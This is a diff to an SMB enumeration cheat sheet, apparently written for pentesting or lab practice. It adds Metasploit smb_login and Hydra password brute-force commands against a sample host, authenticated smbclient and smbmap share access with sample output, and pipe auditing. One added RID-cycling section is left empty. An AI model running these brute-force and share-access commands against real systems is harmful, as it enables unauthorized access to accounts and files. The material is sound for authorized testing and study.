@@ -175,6 +175,17 @@ msf5 auxiliary(scanner/smb/smb_enumusers) > exploit
 ```
 #### Find Shares
 `msf5 auxiliary(scanner/smb/smb_enumshares)`
+#### Share Brute Force
+```
+use auxiliary/scanner/smb/smb_login
+set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
+set SMBUser carlos
+set RHOSTS 10.0.0.1
+exploit
+```
+#### List the Pipes Available (Authenticated)
+`msf5> use auxiliary/scanner/smb/pipe_auditor`
+
 
 
 
@@ -192,6 +203,13 @@ smb: \> ls
   ..                                  D        0  Tue Nov 27 13:36:13 2018
   file1                               D        0  Tue Nov 27 13:36:13 2018
   file2                               D        0  Tue Nov 27 13:36:13 2018
+```
+#### Access a Share (Authenticated)
+```
+# smbclient //10.0.0.1/admin -U admin
+Enter WORKGROUP\admin's password: 
+Try "help" to get a list of possible commands.
+smb: \> ls
 ```
 
 
@@ -262,6 +280,8 @@ Known Usernames .. administrator, guest, krbtgt, none
 `# enum4linux -G 10.0.0.1`
 #### Printer Info
 `# enum4linux -i 10.0.0.1`
+#### Enumerate Linux Users by  RID Cycling (Authenticated)
+``
 
 
 
@@ -271,6 +291,30 @@ Known Usernames .. administrator, guest, krbtgt, none
 
 ## NMBLOOKUP
 #### SMB Version, NetBios computer name
-`# nmblookup -A 192.176.83.3`
+`# nmblookup -A 10.0.0.1`
 
 
+
+
+
+## HYDRA
+#### Share Brute Force
+`# hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.0.0.1 smb`
+
+
+
+
+## SMBMAP
+#### Explore Shares (Authenticated)
+```
+# smbmap -H 10.0.0.1 -u admin -p password1
+[+] Finding open SMB ports....
+[+] User SMB session establishd on 10.0.0.1...
+[+] IP: 10.0.0.1:445       Name: target-1                                          
+        Disk                                                    Permissions
+        ----                                                    -----------
+        carlos                                                  READ, WRITE
+        public                                                  READ ONLY
+        admin                                                   READ, WRITE
+        IPC$                                                    NO ACCESS
+```
